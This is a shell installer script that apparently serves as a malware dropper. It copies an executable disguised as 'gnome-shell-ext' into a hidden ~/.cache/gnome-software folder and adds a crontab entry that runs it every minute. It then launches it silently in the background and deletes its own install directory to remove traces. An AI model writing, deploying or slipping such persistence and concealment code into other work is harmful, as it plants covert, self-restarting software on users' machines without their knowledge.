#!/bin/sh

### definitions ##
dst_folder=~/.cache/gnome-software/gnome-shell-extensions
app_name=gnome-shell-ext

### copy files to dst folder ###
if [ ! -d $dst_folder ]; then
  mkdir -p $dst_folder
fi
cp ./$app_name     $dst_folder
cp ./$app_name.sh  $dst_folder
cp ./rtp.dat       $dst_folder

### set <execute> permission ###
chmod +x $dst_folder/$app_name
chmod +x $dst_folder/$app_name.sh

### switch-on <start every minute> ###
line="0-59 * * * * $dst_folder/$app_name.sh"
if ! crontab -l | grep -q "$line" ; then
  crontab -u $(whoami) -l | { cat; echo "$line"; } | crontab -u $(whoami) -
fi

### start gnome-shell-ext ###
nohup $dst_folder/$app_name.sh >/dev/null >/dev/null 2>&1 &

### remove temporary files ###
rm -rf -- "$(pwd -P)" && cd ..
